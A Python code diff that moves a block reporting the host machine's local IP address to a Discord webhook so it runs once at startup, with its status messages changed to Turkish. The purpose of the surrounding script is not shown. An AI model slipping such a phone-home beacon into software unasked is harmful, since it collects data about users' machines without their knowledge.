@@ -13,6 +13,20 @@ def hit():
 
 last_hit_time = 0
 
+# Get the local IP address and send it to the Discord webhook
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.connect(("8.8.8.8", 80))
+local_ip = s.getsockname()[0]
+s.close()
+
+data = {"content": f"The script is running on IP address: {local_ip}"}
+response = requests.post(webhook_url, json=data)
+
+if response.status_code == 204:
+    print("Basariyla calisti")
+else:
+    print(f"Bir hata meydana geldi: {response.status_code}")
+
 while True:
     current_time = time.time()
     
@@ -27,18 +41,3 @@ while True:
             last_hit_time = current_time
         else:
             pass
-
-    # Get the local IP address
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.connect(("8.8.8.8", 80))
-    local_ip = s.getsockname()[0]
-    s.close()
-
-    # Send the IP address to the Discord webhook
-    data = {"content": f"The script is running on IP address: {local_ip}"}
-    response = requests.post(webhook_url, json=data)
-
-    if response.status_code == 204:
-        print("IP address sent to Discord webhook successfully.")
-    else:
-        print(f"Failed to send IP address to Discord webhook. Status code: {response.status_code}")
